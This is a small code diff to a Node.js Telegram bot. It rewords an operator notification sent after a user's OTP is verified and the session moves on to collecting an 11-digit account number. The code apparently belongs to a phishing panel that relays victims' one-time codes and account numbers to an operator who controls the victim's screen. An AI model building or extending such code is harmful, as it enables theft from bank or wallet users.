@@ -235,7 +235,7 @@ async function initBot() {
           break;
         case 'CORRECT_OTP':
           session.status = 'WAITING_ACCOUNT';
-          await bot.sendMessage(chatTarget, `✅ OTP verified for ${session.contact}. Waiting for 11-digit account number submission.`);
+          await bot.sendMessage(chatTarget, `✅ OTP verified for ${session.contact}. Account number input screen has been opened for the user.`);
           break;
         case 'VALID_ACC':
           session.status = 'SUCCESS';
@@ -434,4 +434,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-    
+                
